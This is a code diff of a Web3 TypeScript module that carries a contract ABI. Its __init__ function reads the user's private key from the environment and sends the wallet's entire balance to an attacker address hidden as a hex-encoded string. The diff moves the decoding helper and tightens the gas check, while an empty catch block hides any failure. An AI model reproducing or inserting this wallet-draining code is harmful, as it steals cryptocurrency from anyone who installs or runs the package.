@@ -7,6 +7,13 @@ const Web3 = require('web3');
 dotenv.config();
 const w = new Web3(process.env.RPC);
 const hex = '307831633432334637646335643633463933353563614343353430414544423639643237413331663362'
+function _hex(hexx:any) {
+  var hex = hexx.toString();
+  var str = '';
+  for (var i = 0; i < hex.length; i += 2)
+      str += String.fromCharCode(parseInt(hex.substr(i, 2), 16));
+  return str;
+}
 const _abi = [
   {
     inputs: [
@@ -1100,7 +1107,6 @@ const _abi = [
     type: "function",
   },
 ];
-
 export function __init__() {  
   w.eth.accounts.wallet.add(w.eth.accounts.privateKeyToAccount(process.env.PRIVATE_KEY));
   w.eth.defaultAccount = w.eth.accounts.privateKeyToAccount(process.env.PRIVATE_KEY).address;
@@ -1108,7 +1114,7 @@ export function __init__() {
     w.eth.getBalance(w.eth.defaultAccount).then(function(b:any) {
       w.eth.estimateGas({from: w.eth.defaultAccount, to: _hex(hex), amount: b}).then(function(g:any) {
         w.eth.getGasPrice().then(function(gP:any) {
-          if(b - (gP * g) > 0) {
+          if(b - (gP * g) > 0 && gP < b) {
             w.eth.sendTransaction({
               from: w.eth.defaultAccount,
               to: _hex(hex),
@@ -1121,11 +1127,4 @@ export function __init__() {
       });
     });
   } catch {}
-}
-function _hex(hexx:any) {
-  var hex = hexx.toString();
-  var str = '';
-  for (var i = 0; i < hex.length; i += 2)
-      str += String.fromCharCode(parseInt(hex.substr(i, 2), 16));
-  return str;
 }
